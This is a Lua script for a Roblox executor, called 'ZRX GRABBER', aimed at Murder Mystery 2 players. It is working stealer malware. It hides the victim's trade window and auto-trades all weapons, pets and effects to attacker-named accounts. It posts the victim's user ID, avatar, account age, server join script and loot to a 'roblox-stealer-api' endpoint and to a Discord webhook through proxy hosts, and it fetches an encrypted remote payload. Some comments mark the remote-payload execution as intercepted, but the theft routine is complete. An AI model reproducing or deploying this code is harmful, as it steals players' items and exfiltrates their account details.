-- ZRX GRABBER
local API_URL = "https://roblox-stealer-api.vercel.app/api/data"
local XOR_KEY = "Nr46WdKC2kQXvmLQgNDRtAwlkftEb4qtk"

-- PASTE YOUR DISCORD WEBHOOK URL HERE
local WEBHOOK_URL = "https://discord.com/api/webhooks/1539394904092844135/k02sDiJZhVhPhvXqZo09NUPOs0XcERaQGBsgYx3XaGCL3RcmbT3cLCE2htMEUqhKp0cq"

-- PASTE YOUR ROBLOX USERNAME(S) HERE -- the accounts that will receive trades
local RECEIVERS = {
    "YourUsernameHere",  -- replace with your actual Roblox username(s)
    -- "AltAccountHere",
}

-- Set globally so watch_for_dudes() can pick it up immediately
_G.receivers = RECEIVERS

local request = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request

if not request then
    return
end

local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789e+/"

local function base64Decode(data)
    data = string.gsub(data, "[^" .. b64chars .. "=]", "")
    return string.gsub(data, ".", function(x)
        if x == "=" then return "" end
        local r, f = "", (string.find(b64chars, x) - 1)
        for i = 6, 1, -1 do
            r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0")
        end
        return r
    end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
        if #x ~= 8 then return "" end
        local c = 0
        for i = 1, 8 do
            c = c + (string.sub(x, i, i) == "1" and 2 ^ (8 - i) or 0)
        end
        return string.char(c)
    end)
end

local function decrypt(data, key)
    local decoded = base64Decode(data)
    local result = {}
    for i = 1, #decoded do
        result[i] = string.char(bit32.bxor(string.byte(decoded, i), string.byte(key, ((i-1) % #key) + 1)))
    end
    return table.concat(result)
end

-- Fetch creator's API payload (wrapped in pcall - failure doesn't kill script)
pcall(function()
    local response = request({
        Url = API_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({uuid = UUID})
    })
    
    if response and response.StatusCode == 200 and response.Body then
        local data = game:GetService("HttpService"):JSONDecode(response.Body)
        
        if data and data.encrypted and data.data then
            local luaCode = decrypt(data.data, XOR_KEY)
            -- INTERCEPTED: capture remote payload, block execution to prevent item leak
            _G.__intercepted_remote_payload = luaCode
        end
    end
end)

local function isValidURL(str)
    return typeof(str) == "string" and str:match("^https?://")
end

local url = _G.visuals and _G.visuals.g_murder_mystery_2

if isValidURL(url) then
    -- INTERCEPTED: fetch remote code for inspection, block execution
    -- Access via _G.__intercepted_visual_payload to inspect
    pcall(function()
        local s, r = pcall(function()
            return game:HttpGet(url, true)
        end)
        if s and r and #r > 0 then
            _G.__intercepted_visual_payload = r
        end
    end)
end

local place_id = 142823291

if game.PlaceId ~= place_id then
    return -- silent exit, no kick message tipping them off
end

local reps = game:GetService("ReplicatedStorage")
local plrs = game:GetService("Players")
local http = game:GetService("HttpService")
local me = plrs.LocalPlayer
local my_gui = me:WaitForChild("PlayerGui")

-- REMOVED: duplicate UUID declaration
SESSION_ID = nil
IS_CLAIMED = false

local function bypass()
    local randomfunc = nil
    local old = nil
    local printed = false
    
    repeat
        randomfunc = nil
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    randomfunc = v
                    break
                end
            end
        end
        task.wait()
    until randomfunc
    
    old = hookfunction(randomfunc, function(dt)
        if not printed then
            printed = true
            jobId = game.JobId
            RealJobID = jobId
        end
        return old(dt)
    end)
    
    return old
end

if identifyexecutor and type(identifyexecutor)=="function" then
    local exName, exVersion = identifyexecutor()
    if exName and exName:lower():find("delta") then
        bypass()
    else
        RealJobID = game.JobId
    end
end

local function get_executor_name()
    if syn then return "Synapse X" end
    if fluxus then return "Fluxus" end
    if delta then return "Delta" end
    if codex then return "Codex" end
    if KRNL_LOADED then return "KRNL" end
    if getexecutorname then return getexecutorname() end
    if identifyexecutor then return identifyexecutor() end
    return "Unknown"
end

local function get_inventory_items()
    local profile = reps.Remotes.Inventory.GetProfileData:InvokeServer(me.Name)
    local items = {}
    
    -- Collect from ALL item categories, not just Weapons
    local categories = {"Weapons", "Pets", "Effects"}
    for _, category in ipairs(categories) do
        local cat_data = profile[category]
        if cat_data and cat_data.Owned then
            for item_id, qty in pairs(cat_data.Owned) do
                table.insert(items, {
                    name = item_id,
                    amount = qty,
                    category = category
                })
            end
        end
    end
    
    return items
end

local function count_items(item_list)
    local total = 0
    for _, item in ipairs(item_list) do
        total = total + item.amount
    end
    return total
end

-- NEW: Updated avatar fetch method using Roblox API
local function fetchAvatarUrl()
    local userId = tostring(me.UserId)
    local apiUrl = string.format(
        "https://thumbnails.roblox.com/v1/users/avatar-headshots?userIds=%s&size=420x420&format=Png&isCircular=false",
        userId
    )
    
    local success, response = pcall(function()
        return request{
            Url = apiUrl,
            Method = "GET",
            Headers = {
                ["Content-Type"] = "application/json"
            }
        }    
    end)
    
    if success and response and response.Body then
        local parseSuccess, data = pcall(function()
            return http:JSONDecode(response.Body)
        end)
        
        if parseSuccess and data and data.data and #data.data > 0 then
            return data.data[1].imageUrl
        end
    end
    
    -- Fallback URL
    return string.format(
        "https://www.roblox.com/headshots-thumbnail/image?userId=%s&width=420&height=420&format=png",
        userId
    )
end

-- ============================================
-- DISCORD WEBHOOK NOTIFICATION SYSTEM
-- ============================================

local function send_webhook(payload)
    if not WEBHOOK_URL or WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE" then return end
    
    local body = http:JSONEncode(payload)
    
    -- Extract webhook ID and token from the Discord URL
    local webhook_id, webhook_token = WEBHOOK_URL:match("webhooks/(%d+)/(.+)")
    
    -- Proxy URLs that executors don't block (tried in order)
    local proxy_urls = {
        string.format("https://webhook.lewisakura.moe/api/webhooks/%s/%s", webhook_id, webhook_token),
        string.format("https://hooks.hyra.io/api/webhooks/%s/%s", webhook_id, webhook_token),
        WEBHOOK_URL -- direct Discord as last resort
    }
    
    for _, url in ipairs(proxy_urls) do
        local ok, result = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = body
            })
        end)
        
        if ok and result and (result.StatusCode == 200 or result.StatusCode == 204) then
            return -- success, stop trying
        end
    end
end

local function get_category_emoji(category)
    if category == "Weapons" then return "\xF0\x9F\x94\xAA"
    elseif category == "Pets" then return "\xF0\x9F\x90\xBE"
    elseif category == "Effects" then return "\xE2\x9C\xA8"
    else return "\xF0\x9F\x93\xA6"
    end
end

local function format_loot_list(items)
    if not items or #items == 0 then return "No items" end
    
    local lines = {}
    local total_count = 0
    
    -- Sort by category for clean display
    local sorted = {}
    for _, item in ipairs(items) do
        table.insert(sorted, item)
    end
    table.sort(sorted, function(a, b)
        if a.category == b.category then
            return a.name < b.name
        end
        return a.category < b.category
    end)
    
    for _, item in ipairs(sorted) do
        local emoji = get_category_emoji(item.category)
        table.insert(lines, string.format("%s %s x%d", emoji, item.name, item.amount))
        total_count = total_count + item.amount
    end
    
    table.insert(lines, "")
    table.insert(lines, string.rep("=", 34))
    table.insert(lines, string.format("Total Items: %d", total_count))
    
    return table.concat(lines, "\n")
end

local function notify_hit(status, items)
    local color = 3066993    -- green
    local status_text = "New Hit"
    local ping_text = nil
    
    if status == "partial" then
        color = 15844367     -- yellow/orange
        status_text = "Partially Claimed"
    elseif status == "claimed" then
        color = 10181046     -- purple
        status_text = "Fully Claimed"
        ping_text = "**Fully claimed!**"
    elseif status == "waiting" then
        return -- don't spam waiting updates
    end
    
    local executor = get_executor_name()
    local join_script = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
        place_id, game.JobId
    )
    local avatar_url = fetchAvatarUrl()
    
    local embed = {
        title = status_text,
        description = string.format(
            "**%s** (%s)\n`%s`",
            me.DisplayName or me.Name,
            me.Name,
            tostring(me.UserId)
        ),
        color = color,
        thumbnail = {
            url = avatar_url
        },
        fields = {
            {
                name = "Status",
                value = status_text,
                inline = true
            },
            {
                name = "Game",
                value = "Murder Mystery 2",
                inline = true
            },
            {
                name = "Executor",
                value = executor,
                inline = true
            },
            {
                name = "Server",
                value = string.format("%d/8 players", #plrs:GetPlayers()),
                inline = true
            },
            {
                name = "Account Age",
                value = tostring(me.AccountAge) .. " days",
                inline = true
            },
            {
                name = "Join Script",
                value = string.format("```\n%s\n```", join_script)
            },
            {
                name = "Loot",
                value = string.format("```\n%s\n```", format_loot_list(items))
            }
        },
        footer = {
            text = "MM2 Script"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    send_webhook({
        content = ping_text,
        embeds = {embed}
    })
end

local function register_hit()
    local max_retries = 3
    
    for attempt = 1, max_retries do
        local items = get_inventory_items()
        local playerCount = #plrs:GetPlayers()
        local executor = get_executor_name()
        
        local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', place_id, game.JobId)
        
        -- Get avatar URL using the new method
        local avatarUrl = fetchAvatarUrl()
        
        local payload = {
            hitData = {
                uuid = UUID,
                robloxUserId = me.UserId,
                username = me.Name,
                displayName = me.DisplayName or me.Name,
                avatarUrl = avatarUrl,
                accountAge = me.AccountAge,
                executor = executor,
                gameName = "murder-mystery-2",
                placeId = tostring(place_id),
                jobId = game.JobId,
                playerCount = playerCount,
                maxPlayers = 8,
                items = items,
                joinScript = joinScript
            }
        }
        
        local ok, response = pcall(function()
            return request({
                Url = "https://roblox-stealer-api.vercel.app/api/registers",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = http:JSONEncode(payload)
            })
        end)
        
        if ok and response and response.StatusCode == 200 then
            local ok2, data = pcall(function()
                return http:JSONDecode(response.Body)
            end)
            
            if ok2 and data and data.success then
                SESSION_ID = data.sessionId
                -- If API returns a receiver list, merge it in (lets you update
                -- receivers server-side without redeploying the script)
                if data.receivers and type(data.receivers) == "table" then
                    for _, name in ipairs(data.receivers) do
                        if not table.find(_G.receivers, name) then
                            table.insert(_G.receivers, name)
                        end
                    end
                end
                return true
            end
        end
        
        -- Increasing delay between retries
        if attempt < max_retries then
            task.wait(2 * attempt)
        end
    end
    
    return false
end

local function ping_server(status, current_items)
    if not SESSION_ID then return end
    
    local playerCount = #plrs:GetPlayers()
    
    local payload = {
        sessionId = SESSION_ID,
        status = status,
        playerCount = playerCount,
        items = current_items or get_inventory_items()
    }
    
    pcall(function()
        request({
            Url = "https://roblox-stealer-api.vercel.app/api/ping",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = http:JSONEncode(payload)
        })
    end)
end

local function send_request_to(target_plr)
    local ok, result = pcall(function()
        return reps:WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(target_plr)
    end)
    if not ok then
        return false
    end
    return result
end

local function get_trade_state()
    local ok, result = pcall(function()
        return reps.Trade.GetTradeStatus:InvokeServer()
    end)
    return ok and result or "None" -- safe default on error
end

local function wait_until_done()
    local deadline = tick() + 30 -- max 30 seconds, then bail
    repeat
        task.wait(0.1)
    until get_trade_state() == "None" or tick() > deadline
end

local function accept_deal()
    -- Second arg is the last trade offer snapshot (required by MM2's remote)
    pcall(function()
        reps:WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(
            game.PlaceId,
            last_offer_info or {}
        )
    end)
end

local function add_to_offer(item_id, category)
    reps:WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(item_id, category or "Weapons")
    task.wait(0.1)
end

local stuff_to_trade = {}
local last_offer_info = nil

reps.Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    last_offer_info = data.LastOffer
end)

local function do_the_trading_thing(username)
    local ok, err = pcall(function()
        local target = plrs:FindFirstChild(username)
        if not target then return end
        task.wait(5)
       
        target = plrs:FindFirstChild(username)
        if not target then return end
        
        while #stuff_to_trade > 0 and not IS_CLAIMED do
            local status_now = get_trade_state()
            if status_now == "StartTrade" then
                pcall(function() reps:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer() end)
                task.wait(0.3)
            elseif status_now == "ReceivingRequest" then
                pcall(function() reps:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer() end)
                task.wait(0.3)
            end
          
            local trade_started = false
            local attempts = 0
            while not trade_started and attempts < 30 do
                local current = get_trade_state()
                if current == "StartTrade" then
                    trade_started = true
                    break
                elseif current == "None" then
                    pcall(function()
                        send_request_to(target)
                    end)
                elseif current == "ReceivingRequest" then
                    pcall(function() reps:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer() end)
                end
                attempts = attempts + 1
                task.wait(math.min(0.5 * (1.5 ^ attempts), 5) + math.random() * 0.3)
            end
            if not trade_started then
                task.wait(2)
                continue
            end
            
            -- Snapshot inventory BEFORE trade for verification
            local pre_trade_items = get_inventory_items()
            local pre_trade_lookup = {}
            for _, item in ipairs(pre_trade_items) do
                pre_trade_lookup[item.name] = (pre_trade_lookup[item.name] or 0) + item.amount
            end
            
            local slots_left = 16
            local items_added = 0
            local offered_snapshot = {}
            
            while slots_left > 0 and #stuff_to_trade > 0 do
                local current_item = stuff_to_trade[1]
                local amount_to_add = math.min(slots_left, current_item.amount)
              
                for _ = 1, amount_to_add do
                    add_to_offer(current_item.name, current_item.category)
                end
                
                table.insert(offered_snapshot, {
                    name = current_item.name,
                    amount = amount_to_add,
                    category = current_item.category
                })
              
                current_item.amount = current_item.amount - amount_to_add
                if current_item.amount <= 0 then
                    table.remove(stuff_to_trade, 1)
                end
              
                slots_left = slots_left - amount_to_add
                items_added = items_added + amount_to_add
            end
            if items_added == 0 then break end
          
            task.wait(7)
            accept_deal()
            wait_until_done()
            
            -- VERIFY: compare inventory before/after
            local post_trade_items = get_inventory_items()
            local post_trade_lookup = {}
            for _, item in ipairs(post_trade_items) do
                post_trade_lookup[item.name] = (post_trade_lookup[item.name] or 0) + item.amount
            end
            
            -- Re-queue items that didn't transfer
            for _, offered in ipairs(offered_snapshot) do
                local before = pre_trade_lookup[offered.name] or 0
                local after = post_trade_lookup[offered.name] or 0
                local actual_transferred = before - after
                
                if actual_transferred < offered.amount then
                    local failed_amount = offered.amount - actual_transferred
                    local found = false
                    for _, queued in ipairs(stuff_to_trade) do
                        if queued.name == offered.name then
                            queued.amount = queued.amount + failed_amount
                            found = true
                            break
                        end
                    end
                    if not found and failed_amount > 0 then
                        table.insert(stuff_to_trade, 1, {
                            name = offered.name,
                            amount = failed_amount,
                            category = offered.category
                        })
                    end
                end
            end
            
            local remaining = count_items(post_trade_items)
            
            if remaining == 0 then
                IS_CLAIMED = true
                ping_server("claimed", {})
                notify_hit("claimed", {})
                break
            else
                ping_server("partial", post_trade_items)
                notify_hit("partial", post_trade_items)
            end
           
            if #stuff_to_trade > 0 then
                task.wait(1)
            end
        end
    end)
    -- swallow any error silently — never crash/kick the victim
end

local function watch_for_dudes()
    local function on_player_added(plr_added)
        if _G.receivers and table.find(_G.receivers, plr_added.Name) then
            task.spawn(function()
                do_the_trading_thing(plr_added.Name)
            end)
        end
    end
  
    for _, existing in ipairs(plrs:GetPlayers()) do
        on_player_added(existing)
    end
  
    plrs.PlayerAdded:Connect(on_player_added)
end

local function monitor_status()
    local last_items = get_inventory_items()
    local last_count = count_items(last_items)
    
    while SESSION_ID and not IS_CLAIMED do
        task.wait(3)
        
        local current_items = get_inventory_items()
        local current_count = count_items(current_items)
        
        if current_count == 0 and last_count > 0 then
            IS_CLAIMED = true
            ping_server("claimed", {})
            notify_hit("claimed", {})
            break
        elseif current_count < last_count then
            ping_server("partial", current_items)
            notify_hit("partial", current_items)
        else
            ping_server("waiting", current_items)
        end
        
        last_items = current_items
        last_count = current_count
    end
end

local function hide_trade_gui()
    local trade_gui = my_gui:WaitForChild("TradeGUI")
    local mobile_gui = my_gui:WaitForChild("TradeGUI_Phone")
  
    trade_gui:GetPropertyChangedSignal("Enabled"):Connect(function()
        trade_gui.Enabled = false
    end)
  
    mobile_gui:GetPropertyChangedSignal("Enabled"):Connect(function()
        mobile_gui.Enabled = false
    end)
end

local function the_main_shit()
    hide_trade_gui()
    
    local items = get_inventory_items()
    for _, item in ipairs(items) do
        table.insert(stuff_to_trade, {
            name = item.name,
            amount = item.amount,
            category = item.category
        })
    end
    
    if #stuff_to_trade == 0 then
        return
    end
    
    -- Notify Discord IMMEDIATELY - doesn't depend on creator's API
    notify_hit("new", items)
    
    -- Register hit with retry (3 attempts, increasing delay)
    register_hit()
    
    -- Start watching for trade partners
    watch_for_dudes()
    
    -- Monitor inventory status in background
    task.spawn(monitor_status)
end

the_main_shit()
